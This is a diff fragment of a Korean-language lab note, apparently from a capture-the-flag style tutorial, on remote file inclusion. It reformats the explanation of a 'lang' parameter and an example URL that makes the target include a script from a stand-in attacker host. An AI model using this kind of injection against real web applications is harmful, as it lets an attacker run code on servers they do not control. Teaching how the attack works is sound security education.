@@ -17,10 +17,8 @@ http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
 
 ## 각 파라미터의 의미
 
-| 항목 | 의미 |
-|------|------|
-| `lang` | 포함할 파일을 지정하는 파라미터 |
-| `http://attacker.thm/cmd.txt` | 공격자가 준비한 원격 스크립트 |
+- `lang`: 포함할 파일을 지정하는 파라미터
+- `http://attacker.thm/cmd.txt`: 공격자가 준비한 원격 스크립트
 
 ## 동작 원리
 
